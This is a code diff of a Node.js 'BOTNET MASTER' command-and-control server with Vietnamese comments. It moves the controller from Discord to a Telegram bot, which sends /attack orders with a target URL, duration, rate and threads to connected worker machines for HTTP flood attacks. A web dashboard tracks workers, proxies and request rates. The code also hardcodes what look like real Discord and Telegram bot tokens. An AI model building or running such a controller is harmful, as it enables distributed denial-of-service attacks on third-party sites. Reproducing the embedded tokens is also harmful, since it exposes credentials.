@@ -8,23 +8,22 @@ process.on('unhandledRejection', (err) => {
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const { Client, GatewayIntentBits } = require('discord.js');
-const path = require('path');
-const fs = require('fs');
+const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios');
 
 // ==================== CONFIG ====================
 const PORT = process.env.PORT || 10000;
-const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.GxNoGJ.TJ2YVxoiIFIxF-_s9ju7Uy0zegnIcKRllG11gM';
-const CHANNEL_ID = '1456595444477198508';
+const BOT_TOKEN = '8317101752:AAG0OxVpnew7KH1ncf3xZQ_FX4Cln6CvKPM';
+const ADMIN_ID = '8344034544';
 
 // ==================== KIỂM TRA CONFIG ====================
-if (TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-    console.error('[!] LỖI: Bạn chưa cấu hình TOKEN Discord!');
+if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+    console.error('[!] LỖI: Bạn chưa cấu hình BOT_TOKEN!');
     process.exit(1);
 }
 
-if (CHANNEL_ID === 'YOUR_CHANNEL_ID_HERE') {
-    console.error('[!] LỖI: Bạn chưa cấu hình CHANNEL_ID Discord!');
+if (ADMIN_ID === 'YOUR_ADMIN_ID_HERE') {
+    console.error('[!] LỖI: Bạn chưa cấu hình ADMIN_ID!');
     process.exit(1);
 }
 
@@ -32,41 +31,252 @@ if (CHANNEL_ID === 'YOUR_CHANNEL_ID_HERE') {
 const app = express();
 const server = http.createServer(app);
 
-// Cấu hình Socket.IO - SIÊU ỔN ĐỊNH
+// Cấu hình Socket.IO
 const io = new Server(server, {
     cors: {
         origin: "*",
-        methods: ["GET", "POST"],
-        credentials: true,
-        allowedHeaders: ["*"]
+        methods: ["GET", "POST"]
     },
     transports: ['websocket', 'polling'],
-    allowEIO3: true,
-    pingTimeout: 60000,        // 60 giây
-    pingInterval: 25000,        // 25 giây
-    connectTimeout: 60000,
-    maxHttpBufferSize: 1e8,
-    cookie: false
+    pingTimeout: 60000,
+    pingInterval: 25000
 });
 
-// ==================== MIDDLEWARE ====================
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
-
 // ==================== BIẾN TOÀN CỤC ====================
-let workers = new Map(); // { socket.id: { socket, ip, status, target, lastSeen } }
+let workers = new Map(); // { socket.id: { socket, ip, status, target, lastSeen, info } }
 let currentAttack = null;
 let totalRequests = 0;
 let attackStartTime = null;
 
-// ==================== ROUTES ====================
+// ==================== TELEGRAM BOT ====================
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Route chính
+// Command /start
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) {
+        return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng bot này!');
+    }
+    
+    bot.sendMessage(chatId, `
+🔥 **BOTNET MASTER READY**
+
+📡 Workers: ${workers.size}
+🎯 Status: ${currentAttack ? 'ATTACKING' : 'IDLE'}
+
+📚 **COMMANDS:**
+/workers - Xem danh sách worker
+/attack <url> <time> <rate> <threads> - Bắt đầu tấn công
+/stop - Dừng tấn công
+/status - Xem trạng thái
+/help - Hướng dẫn
+    `, { parse_mode: 'Markdown' });
+});
+
+// Command /help
+bot.onText(/\/help/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) return;
+    
+    bot.sendMessage(chatId, `
+📚 **HƯỚNG DẪN SỬ DỤNG**
+
+/workers - Xem danh sách worker đang kết nối
+
+/attack <url> <time> <rate> <threads> - Bắt đầu tấn công
+  Ví dụ: \`/attack https://example.com 300 500 50\`
+  - url: target cần tấn công
+  - time: thời gian (giây)
+  - rate: số request mỗi worker
+  - threads: số luồng mỗi worker
+
+/stop - Dừng tất cả tấn công
+
+/status - Xem trạng thái hiện tại
+
+/help - Hiện hướng dẫn này
+    `, { parse_mode: 'Markdown' });
+});
+
+// Command /workers
+bot.onText(/\/workers/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) return;
+    
+    if (workers.size === 0) {
+        return bot.sendMessage(chatId, '❌ Không có worker nào đang kết nối!');
+    }
+    
+    let message = `📡 **WORKERS (${workers.size}):**\n\n`;
+    workers.forEach((worker, id) => {
+        const statusEmoji = worker.status === 'attacking' ? '🔥' : '💤';
+        const targetInfo = worker.target ? `🎯 ${worker.target}` : '';
+        const proxyInfo = worker.info?.proxies ? `📦 ${worker.info.proxies} proxies` : '';
+        const lastSeen = Math.floor((Date.now() - worker.lastSeen) / 1000);
+        
+        message += `${statusEmoji} \`${worker.ip}\`\n`;
+        message += `   Status: ${worker.status}\n`;
+        if (targetInfo) message += `   ${targetInfo}\n`;
+        if (proxyInfo) message += `   ${proxyInfo}\n`;
+        message += `   Last seen: ${lastSeen}s ago\n\n`;
+    });
+    
+    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+});
+
+// Command /attack
+bot.onText(/\/attack (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) return;
+    
+    const args = match[1].split(' ');
+    if (args.length < 4) {
+        return bot.sendMessage(chatId, '❌ Thiếu tham số! Dùng: /attack <url> <time> <rate> <threads>');
+    }
+    
+    const target = args[0];
+    const time = parseInt(args[1]);
+    const rate = parseInt(args[2]);
+    const threads = parseInt(args[3]);
+    
+    // Kiểm tra tham số
+    if (!target.startsWith('http')) {
+        return bot.sendMessage(chatId, '❌ URL phải bắt đầu bằng http:// hoặc https://');
+    }
+    
+    if (isNaN(time) || time < 10) {
+        return bot.sendMessage(chatId, '❌ Thời gian phải >= 10 giây');
+    }
+    
+    if (isNaN(rate) || rate < 10) {
+        return bot.sendMessage(chatId, '❌ Rate phải >= 10');
+    }
+    
+    if (isNaN(threads) || threads < 1) {
+        return bot.sendMessage(chatId, '❌ Threads phải >= 1');
+    }
+    
+    if (workers.size === 0) {
+        return bot.sendMessage(chatId, '❌ Không có worker nào để tấn công!');
+    }
+    
+    // Dừng attack cũ nếu có
+    if (currentAttack) {
+        io.emit('stop');
+        currentAttack = null;
+    }
+    
+    // Bắt đầu attack mới
+    currentAttack = { target, time, rate, threads, start: Date.now() };
+    totalRequests = 0;
+    attackStartTime = Date.now();
+    
+    // Gửi lệnh cho tất cả worker
+    let sentCount = 0;
+    workers.forEach((worker, id) => {
+        if (worker.status === 'idle' && worker.socket && worker.socket.connected) {
+            worker.socket.emit('attack', currentAttack);
+            worker.status = 'attacking';
+            worker.target = target;
+            sentCount++;
+        }
+    });
+    
+    bot.sendMessage(chatId, `
+🔥 **BOTNET ATTACK STARTED**
+🎯 Target: ${target}
+⏱️ Time: ${time}s
+⚡ Rate: ${rate}/worker
+🧵 Threads: ${threads}/worker
+📡 Workers: ${sentCount}/${workers.size}
+    `, { parse_mode: 'Markdown' });
+    
+    // Tự động kết thúc sau thời gian
+    setTimeout(() => {
+        if (currentAttack) {
+            io.emit('stop');
+            
+            workers.forEach(worker => {
+                if (worker.status === 'attacking') {
+                    worker.status = 'idle';
+                    worker.target = null;
+                }
+            });
+            
+            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
+            bot.sendMessage(chatId, `
+✅ **ATTACK FINISHED**
+⏱️ Time: ${elapsed}s
+📊 Total Requests: ${totalRequests.toLocaleString()}
+⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
+📡 Workers: ${workers.size}
+            `, { parse_mode: 'Markdown' });
+            
+            currentAttack = null;
+        }
+    }, time * 1000);
+});
+
+// Command /stop
+bot.onText(/\/stop/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) return;
+    
+    if (currentAttack) {
+        io.emit('stop');
+        
+        workers.forEach(worker => {
+            if (worker.status === 'attacking') {
+                worker.status = 'idle';
+                worker.target = null;
+            }
+        });
+        
+        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
+        bot.sendMessage(chatId, `
+🛑 **ATTACK STOPPED**
+⏱️ Time: ${elapsed}s
+📊 Total Requests: ${totalRequests.toLocaleString()}
+⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
+        `, { parse_mode: 'Markdown' });
+        
+        currentAttack = null;
+    } else {
+        bot.sendMessage(chatId, '⚠️ Không có attack nào đang chạy');
+    }
+});
+
+// Command /status
+bot.onText(/\/status/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    if (chatId !== ADMIN_ID) return;
+    
+    if (currentAttack) {
+        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
+        const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
+        
+        bot.sendMessage(chatId, `
+📊 **ATTACK STATUS**
+🎯 Target: ${currentAttack.target}
+⏱️ Time: ${elapsed}s / ${currentAttack.time}s
+📊 Requests: ${totalRequests.toLocaleString()}
+⚡ RPS: ${Math.floor(totalRequests / elapsed)}
+📡 Workers: ${attacking}/${workers.size}
+        `, { parse_mode: 'Markdown' });
+    } else {
+        bot.sendMessage(chatId, `
+📡 **SYSTEM STATUS**
+Workers: ${workers.size}
+Status: IDLE
+        `, { parse_mode: 'Markdown' });
+    }
+});
+
+// ==================== WEB DASHBOARD ====================
 app.get('/', (req, res) => {
     const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
     
     res.send(`
-        <!DOCTYPE html>
         <html>
         <head>
             <title>🔥 BOTNET MASTER</title>
@@ -76,77 +286,46 @@ app.get('/', (req, res) => {
                 body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
                 .container { max-width: 1200px; margin: 0 auto; }
                 .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
-                .stat { font-size: 24px; color: #00ff00; }
+                .stat { color: #00ff00; font-size: 20px; }
                 .label { color: #888; }
                 .attacking { color: #ff4444; }
-                .idle { color: #888; }
                 table { width: 100%; border-collapse: collapse; }
                 th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
                 th { color: #00ff00; }
-                .online { color: #00ff00; }
-                .offline { color: #ff4444; }
             </style>
             <meta http-equiv="refresh" content="5">
         </head>
         <body>
             <div class="container">
-                <h1>🔥 BOTNET MASTER CONTROLLER</h1>
+                <h1>🔥 BOTNET MASTER</h1>
                 
                 <div class="card">
                     <h2>System Status</h2>
-                    <table>
-                        <tr><td class="label">Workers Online:</td><td class="stat">${workers.size}</td></tr>
-                        <tr><td class="label">Status:</td><td class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</td></tr>
-                        <tr><td class="label">Total Requests:</td><td class="stat">${totalRequests.toLocaleString()}</td></tr>
-                        <tr><td class="label">Port:</td><td class="stat">${PORT}</td></tr>
-                        <tr><td class="label">Uptime:</td><td class="stat">${Math.floor(process.uptime() / 60)} minutes</td></tr>
-                    </table>
+                    <p><span class="label">Workers:</span> <span class="stat">${workers.size}</span></p>
+                    <p><span class="label">Status:</span> <span class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</span></p>
+                    <p><span class="label">Total Requests:</span> <span class="stat">${totalRequests.toLocaleString()}</span></p>
                 </div>
                 
                 <div class="card">
-                    <h2>Current Attack</h2>
-                    ${currentAttack ? `
-                    <table>
-                        <tr><td class="label">Target:</td><td class="attacking">${currentAttack.target}</td></tr>
-                        <tr><td class="label">Time:</td><td>${Math.floor((Date.now() - currentAttack.start) / 1000)}s / ${currentAttack.time}s</td></tr>
-                        <tr><td class="label">Rate/Worker:</td><td>${currentAttack.rate}</td></tr>
-                        <tr><td class="label">Threads/Worker:</td><td>${currentAttack.threads}</td></tr>
-                        <tr><td class="label">Workers Attacking:</td><td>${attacking}</td></tr>
-                    </table>
-                    ` : '<p>No active attack</p>'}
-                </div>
-                
-                <div class="card">
-                    <h2>Workers List (${workers.size})</h2>
+                    <h2>Workers List</h2>
                     <table>
                         <tr>
                             <th>IP</th>
                             <th>Status</th>
                             <th>Target</th>
+                            <th>Proxies</th>
                             <th>Last Seen</th>
-                            <th>Connection</th>
                         </tr>
-                        ${Array.from(workers.entries()).map(([id, w]) => `
+                        ${Array.from(workers.values()).map(w => `
                         <tr>
                             <td>${w.ip}</td>
-                            <td class="${w.status === 'attacking' ? 'attacking' : 'idle'}">${w.status === 'attacking' ? '🔥 ATTACKING' : '💤 IDLE'}</td>
+                            <td class="${w.status === 'attacking' ? 'attacking' : ''}">${w.status}</td>
                             <td>${w.target || '-'}</td>
-                            <td>${Math.floor((Date.now() - w.lastSeen) / 1000)}s ago</td>
-                            <td class="${w.socket?.connected ? 'online' : 'offline'}">${w.socket?.connected ? '✅ ONLINE' : '❌ OFFLINE'}</td>
+                            <td>${w.info?.proxies || 0}</td>
+                            <td>${Math.floor((Date.now() - w.lastSeen) / 1000)}s</td>
                         </tr>
                         `).join('')}
                         ${workers.size === 0 ? '<tr><td colspan="5" style="text-align:center">No workers connected</td></tr>' : ''}
-                    </table>
-                </div>
-                
-                <div class="card">
-                    <h2>Discord Commands</h2>
-                    <table>
-                        <tr><td><code>!workers</code></td><td>- Xem danh sách worker</td></tr>
-                        <tr><td><code>!flood &lt;url&gt; &lt;time&gt; &lt;rate&gt; &lt;threads&gt;</code></td><td>- Bắt đầu tấn công</td></tr>
-                        <tr><td><code>!stop</code></td><td>- Dừng tấn công</td></tr>
-                        <tr><td><code>!status</code></td><td>- Xem trạng thái</td></tr>
-                        <tr><td><code>!help</code></td><td>- Xem hướng dẫn</td></tr>
                     </table>
                 </div>
             </div>
@@ -155,45 +334,16 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Route API
-app.get('/api/status', (req, res) => {
-    const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
-    
-    res.json({
-        workers: workers.size,
-        attacking: attacking,
-        idle: workers.size - attacking,
-        totalRequests: totalRequests,
-        currentAttack: currentAttack ? {
-            target: currentAttack.target,
-            time: currentAttack.time,
-            elapsed: Math.floor((Date.now() - currentAttack.start) / 1000),
-            rate: currentAttack.rate,
-            threads: currentAttack.threads
-        } : null,
-        workersList: Array.from(workers.values()).map(w => ({
-            ip: w.ip,
-            status: w.status,
-            target: w.target,
-            lastSeen: w.lastSeen,
-            connected: w.socket?.connected || false
-        }))
-    });
-});
-
-// Health check
 app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'ok', 
+    res.json({
+        status: 'ok',
         workers: workers.size,
-        port: PORT,
-        uptime: process.uptime(),
-        memory: process.memoryUsage(),
-        connections: Object.keys(io.sockets.sockets || {}).length
+        attacking: Array.from(workers.values()).filter(w => w.status === 'attacking').length,
+        uptime: process.uptime()
     });
 });
 
-// ==================== SOCKET.IO - XỬ LÝ WORKER ====================
+// ==================== SOCKET.IO - NHẬN KẾT NỐI WORKER ====================
 io.on('connection', (socket) => {
     const clientIp = socket.handshake.address;
     console.log(`[+] Worker connected: ${socket.id} from ${clientIp}`);
@@ -207,10 +357,18 @@ io.on('connection', (socket) => {
             ip: workerIp,
             status: 'idle',
             target: null,
-            lastSeen: Date.now()
+            lastSeen: Date.now(),
+            info: {
+                proxies: data.proxies || 0,
+                totalProxies: data.totalProxies || 0
+            }
         });
         
         console.log(`[+] Worker registered: ${workerIp} (Total: ${workers.size})`);
+        
+        // Gửi thông báo Telegram
+        const chatId = ADMIN_ID;
+        bot.sendMessage(chatId, `✅ Worker connected: \`${workerIp}\`\n📡 Total workers: ${workers.size}`, { parse_mode: 'Markdown' });
 
         // Nếu đang có attack, gửi lệnh cho worker mới
         if (currentAttack) {
@@ -222,13 +380,11 @@ io.on('connection', (socket) => {
         socket.emit('registered', { status: 'ok', workers: workers.size });
     });
 
-    // Xử lý ping - GIỮ KẾT NỐI
+    // Xử lý ping
     socket.on('ping', () => {
         socket.emit('pong');
         const worker = workers.get(socket.id);
-        if (worker) {
-            worker.lastSeen = Date.now();
-        }
+        if (worker) worker.lastSeen = Date.now();
     });
 
     // Nhận stats từ worker
@@ -242,43 +398,34 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Xử lý ngắt kết nối
+    // Ngắt kết nối
     socket.on('disconnect', (reason) => {
         const worker = workers.get(socket.id);
         if (worker) {
             console.log(`[-] Worker disconnected: ${worker.ip} - Reason: ${reason}`);
             
-            // Nếu worker đang attack, cập nhật trạng thái
-            if (worker.status === 'attacking' && currentAttack) {
-                console.log(`[!] Worker ${worker.ip} lost during attack`);
-            }
+            // Gửi thông báo Telegram
+            const chatId = ADMIN_ID;
+            bot.sendMessage(chatId, `❌ Worker disconnected: \`${worker.ip}\`\n📡 Workers left: ${workers.size - 1}`, { parse_mode: 'Markdown' });
             
             workers.delete(socket.id);
         }
     });
-
-    // Xử lý lỗi
-    socket.on('error', (error) => {
-        console.error(`[!] Socket error from ${socket.id}:`, error.message);
-    });
 });
 
-// ==================== GIỮ KẾT NỐI WORKER ====================
-
-// Gửi ping định kỳ đến tất cả worker
+// ==================== PING WORKER ĐỊNH KỲ ====================
 setInterval(() => {
     workers.forEach((worker, id) => {
         if (worker.socket && worker.socket.connected) {
             worker.socket.emit('ping');
         }
     });
-}, 15000); // 15 giây
+}, 15000);
 
-// Kiểm tra worker chết và xóa
+// Kiểm tra worker chết
 setInterval(() => {
     const now = Date.now();
     workers.forEach((worker, id) => {
-        // Nếu worker không gửi heartbeat trong 60 giây, coi như chết
         if (now - worker.lastSeen > 60000) {
             console.log(`[-] Worker ${worker.ip} timeout, removing...`);
             if (worker.socket) {
@@ -287,219 +434,11 @@ setInterval(() => {
             workers.delete(id);
         }
     });
-}, 30000); // 30 giây
+}, 30000);
 
-// ==================== DISCORD BOT ====================
-const discordClient = new Client({ 
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
-    ] 
-});
-
-discordClient.once('ready', () => {
-    console.log(`[+] Discord Bot ready as ${discordClient.user.tag}`);
-    
-    const channel = discordClient.channels.cache.get(CHANNEL_ID);
-    if (channel) {
-        channel.send(`
-╔══════════════════════════════════════════════════════╗
-║     🔥 BOTNET MASTER - READY                         ║
-╠══════════════════════════════════════════════════════╣
-║  📡 Workers: ${workers.size}                                         ║
-║  🌐 Port: ${PORT}                                            ║
-║  🔗 URL: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}  ║
-╠══════════════════════════════════════════════════════╣
-║  📚 COMMANDS:                                          ║
-║  !flood <url> <time> <rate> <threads>                ║
-║  !stop                                                ║
-║  !status                                              ║
-║  !workers                                             ║
-║  !help                                                ║
-╚══════════════════════════════════════════════════════╝
-        `);
-    }
-});
-
-discordClient.on('messageCreate', async (msg) => {
-    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
-
-    const args = msg.content.slice(1).split(' ');
-    const cmd = args[0].toLowerCase();
-
-    if (cmd === 'help') {
-        msg.channel.send(`
-**📚 HƯỚNG DẪN SỬ DỤNG**
-\`!flood <url> <time> <rate> <threads>\` - Bắt đầu tấn công
-  Ví dụ: \`!flood https://example.com 300 500 50\`
-
-\`!stop\` - Dừng tất cả tấn công
-\`!status\` - Xem trạng thái hiện tại
-\`!workers\` - Xem danh sách worker
-\`!help\` - Hiện hướng dẫn này
-        `);
-    }
-
-    else if (cmd === 'workers') {
-        if (workers.size === 0) {
-            return msg.channel.send('❌ Không có worker nào đang kết nối!');
-        }
-
-        const list = Array.from(workers.values()).map(w => 
-            `🔹 ${w.ip} - ${w.status === 'attacking' ? '🔥 ATTACKING' : '💤 IDLE'} ${w.target ? '🎯 ' + w.target : ''}`
-        ).join('\n');
-
-        msg.channel.send(`**📡 WORKERS (${workers.size}):**\n${list}`);
-    }
-
-    else if (cmd === 'flood') {
-        if (args.length < 5) {
-            return msg.channel.send('❌ Thiếu tham số! Dùng: !flood <url> <time> <rate> <threads>');
-        }
-
-        const target = args[1];
-        const time = parseInt(args[2]);
-        const rate = parseInt(args[3]);
-        const threads = parseInt(args[4]);
-
-        if (!target.startsWith('http')) {
-            return msg.channel.send('❌ URL phải bắt đầu bằng http:// hoặc https://');
-        }
-
-        if (isNaN(time) || time < 10) {
-            return msg.channel.send('❌ Thời gian phải >= 10 giây');
-        }
-
-        if (isNaN(rate) || rate < 10) {
-            return msg.channel.send('❌ Rate phải >= 10');
-        }
-
-        if (isNaN(threads) || threads < 1) {
-            return msg.channel.send('❌ Threads phải >= 1');
-        }
-
-        if (workers.size === 0) {
-            return msg.channel.send('❌ Không có worker nào để tấn công!');
-        }
-
-        // Dừng attack cũ nếu có
-        if (currentAttack) {
-            io.emit('stop');
-            currentAttack = null;
-        }
-
-        // Bắt đầu attack mới
-        currentAttack = { target, time, rate, threads, start: Date.now() };
-        totalRequests = 0;
-        attackStartTime = Date.now();
-
-        // Gửi lệnh cho tất cả worker
-        let sentCount = 0;
-        workers.forEach((worker, id) => {
-            if (worker.status === 'idle' && worker.socket && worker.socket.connected) {
-                worker.socket.emit('attack', currentAttack);
-                worker.status = 'attacking';
-                worker.target = target;
-                sentCount++;
-            }
-        });
-
-        msg.channel.send(`
-🔥 **BOTNET ATTACK STARTED**
-🎯 Target: ${target}
-⏱️ Time: ${time}s
-⚡ Rate: ${rate}/worker
-🧵 Threads: ${threads}/worker
-📡 Workers: ${sentCount}/${workers.size}
-        `);
-
-        // Tự động kết thúc sau thời gian
-        setTimeout(() => {
-            if (currentAttack) {
-                io.emit('stop');
-                
-                workers.forEach(worker => {
-                    if (worker.status === 'attacking') {
-                        worker.status = 'idle';
-                        worker.target = null;
-                    }
-                });
-
-                const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
-                msg.channel.send(`
-✅ **ATTACK FINISHED**
-⏱️ Time: ${elapsed}s
-📊 Total Requests: ${totalRequests.toLocaleString()}
-⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
-📡 Workers: ${workers.size}
-                `);
-                
-                currentAttack = null;
-            }
-        }, time * 1000);
-    }
-
-    else if (cmd === 'stop') {
-        if (currentAttack) {
-            io.emit('stop');
-            
-            workers.forEach(worker => {
-                if (worker.status === 'attacking') {
-                    worker.status = 'idle';
-                    worker.target = null;
-                }
-            });
-
-            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
-            msg.channel.send(`
-🛑 **ATTACK STOPPED**
-⏱️ Time: ${elapsed}s
-📊 Total Requests: ${totalRequests.toLocaleString()}
-⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
-            `);
-            
-            currentAttack = null;
-        } else {
-            msg.channel.send('⚠️ Không có attack nào đang chạy');
-        }
-    }
-
-    else if (cmd === 'status') {
-        if (currentAttack) {
-            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
-            const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
-            
-            msg.channel.send(`
-📊 **ATTACK STATUS**
-🎯 Target: ${currentAttack.target}
-⏱️ Time: ${elapsed}s / ${currentAttack.time}s
-📊 Requests: ${totalRequests.toLocaleString()}
-⚡ RPS: ${Math.floor(totalRequests / elapsed)}
-📡 Workers: ${attacking}/${workers.size}
-            `);
-        } else {
-            msg.channel.send(`📡 **SYSTEM STATUS**\nWorkers: ${workers.size}\nStatus: IDLE`);
-        }
-    }
-});
-
+// ==================== START SERVER ====================
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`[+] Master server running on port ${PORT}`);
-    console.log(`[+] Health check: http://localhost:${PORT}/health`);
-    console.log(`[+] Waiting for workers...`);
-});
-
-// Discord login
-discordClient.login(TOKEN).catch(err => {
-    console.error('[!] Discord login failed:', err.message);
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-    console.log('[!] Received SIGTERM, shutting down...');
-    io.emit('shutdown');
-    server.close(() => {
-        process.exit(0);
-    });
+    console.log(`[+] Web dashboard: http://localhost:${PORT}`);
+    console.log(`[+] Telegram bot started!`);
 });
